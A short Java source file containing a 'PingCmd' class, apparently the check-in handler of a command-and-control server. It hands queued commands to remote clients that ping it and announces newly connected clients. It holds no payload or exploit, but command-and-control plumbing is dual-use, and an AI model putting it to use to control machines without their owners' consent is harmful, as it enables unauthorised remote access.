package commands;

import server.CommandServer;
import server.ConnectedClient;
import tools.ParsedCommand;

/**
 * Answer a ping
 * 
 * @author Yohan Chalier
 *
 */
public class PingCmd extends ServerCommand {

	public PingCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		ConnectedClient client;
		if ((client = c2.getClients().identify(pCmd.args[0])) != null
				&& client.hasCmd()) {
			return client.popCmd();
		}
		if (c2.getCurrentClient() >= 0) {
			c2.setClientConnected(true);
			System.out.print("\nClient " + c2.getCurrentClient()
					+ " connected.\n" + c2.getPrefix() + ">");
			return N_DONE;
		}
		return DONE;
	}

}
